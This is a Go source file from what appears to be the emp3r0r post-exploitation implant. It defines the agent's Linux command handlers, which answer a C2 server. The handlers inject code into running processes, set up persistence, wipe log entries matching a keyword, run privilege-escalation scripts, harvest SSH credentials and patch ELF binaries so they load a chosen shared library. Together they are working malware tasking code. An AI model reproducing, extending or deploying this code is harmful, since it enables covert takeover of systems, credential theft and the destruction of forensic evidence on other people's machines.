//go:build linux
// +build linux

package handler

import (
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
	"github.com/spf13/cobra"
)

// runInjectLinux implements: !inject --method <method> --pid <pid> --checksum <checksum>
func runInjectLinux(cmd *cobra.Command, args []string) {
	method, _ := cmd.Flags().GetString("method")
	pid, _ := cmd.Flags().GetString("pid")
	checksum, _ := cmd.Flags().GetString("checksum")
	if method == "" || pid == "" || checksum == "" {
		c2transport.NotifyC2(cmd, "%s", "Error: args error")
		return
	}
	pidInt, err := strconv.ParseInt(pid, 10, 32)
	if err != nil {
		logging.Println("Invalid pid")
		c2transport.NotifyC2(cmd, "%s", "Error: invalid pid")
		return
	}
	err = modules.InjectorHandler(int(pidInt), method, checksum)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", "Error: "+err.Error())
		return
	}
	c2transport.NotifyC2(cmd, "%s", method+": success")
}

// runPersistenceLinux implements: !persistence --method <method>
func runPersistenceLinux(cmd *cobra.Command, _ []string) {
	method, _ := cmd.Flags().GetString("method")
	if method == "" {
		c2transport.NotifyC2(cmd, "%s", "Error: args error")
		return
	}

	// check if we have a custom file to persist
	// format: method:file_path
	if len(os.Args) > 0 {
		modules.PersistFile = os.Args[0]
	}
	if strings.Contains(method, ":") {
		parts := strings.Split(method, ":")
		method = parts[0]
		modules.PersistFile = parts[1]
	}

	if method == "all" {
		err := modules.PersistAllInOne()
		if err != nil {
			logging.Println(err)
			c2transport.NotifyC2(cmd, "%s", "Some has failed: "+err.Error())
		} else {
			c2transport.NotifyC2(cmd, "%s", "Success")
		}
		return
	} else {
		if persistMethod, exists := modules.PersistMethods[method]; exists {
			err := persistMethod()
			if err != nil {
				logging.Println(err)
				c2transport.NotifyC2(cmd, "%s", "Error: "+err.Error())
			} else {
				c2transport.NotifyC2(cmd, "%s", "Success")
			}
		} else {
			c2transport.NotifyC2(cmd, "%s", "Error: No such method available")
		}
	}
}

// runGetRootLinux implements: !get_root
func runGetRootLinux(cmd *cobra.Command, args []string) {
	if os.Geteuid() == 0 {
		c2transport.NotifyC2(cmd, "%s", "Warning: You already have root!")
	} else {
		c2transport.NotifyC2(cmd, "%s", "Deprecated")
	}
}

// runCleanLogLinux implements: !clean_log --keyword <keyword>
func runCleanLogLinux(cmd *cobra.Command, args []string) {
	keyword, _ := cmd.Flags().GetString("keyword")
	if keyword == "" {
		c2transport.NotifyC2(cmd, "%s", "Error: args error")
		return
	}
	err := modules.CleanAllByKeyword(keyword)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	c2transport.NotifyC2(cmd, "%s", "Done")
}

// runLPELinux implements: !lpe --script_name <script_name> --checksum <checksum>
func runLPELinux(cmd *cobra.Command, args []string) {
	scriptName, _ := cmd.Flags().GetString("script_name")
	checksum, _ := cmd.Flags().GetString("checksum")
	if scriptName == "" || checksum == "" {
		c2transport.NotifyC2(cmd, "%s", "Error: args error")
		return
	}
	out := modules.RunLPEHelper(scriptName, checksum)
	c2transport.NotifyC2(cmd, "%s", out)
}

// runSSHHarvesterLinux implements: !ssh_harvester --code_pattern <hex> --reg_name <reg> --stop <bool>
func runSSHHarvesterLinux(cmd *cobra.Command, args []string) {
	codePattern, _ := cmd.Flags().GetString("code_pattern")
	regName, _ := cmd.Flags().GetString("reg_name")
	stop, _ := cmd.Flags().GetBool("stop")
	if stop && modules.SshHarvesterCancel != nil {
		modules.SshHarvesterCancel()
		c2transport.NotifyC2(cmd, "%s", "SSH harvester stopped")
		return
	}
	codePatternBytes, err := hex.DecodeString(codePattern)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("Error parsing hex string: %v", err))
		return
	}
	if modules.SshHarvesterRunning {
		c2transport.NotifyC2(cmd, "%s", "SSH harvester is already running")
	} else {
		go modules.SshHarvester(cmd, codePatternBytes, regName)
	}
}

// runElfPatchLinux implements: !elf_patch --elf_path <path> --so_path <so_path> [--target_path <target_path>]
func runElfPatchLinux(cmd *cobra.Command, args []string) {
	elfPath, _ := cmd.Flags().GetString("elf_path")
	soPath, _ := cmd.Flags().GetString("so_path")
	targetPath, _ := cmd.Flags().GetString("target_path")

	if elfPath == "" {
		c2transport.NotifyC2(cmd, "Error: elf_path is required")
		return
	}

	if soPath == "" {
		c2transport.NotifyC2(cmd, "Error: so_path is required")
		return
	}

	err := modules.ElfPatcher(elfPath, soPath, targetPath)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: %v", err)
		return
	}

	if targetPath != "" {
		c2transport.NotifyC2(cmd, "Successfully patched %s to load %s", elfPath, targetPath)
	} else {
		c2transport.NotifyC2(cmd, "Successfully patched %s to load library at random location", elfPath)
	}
}
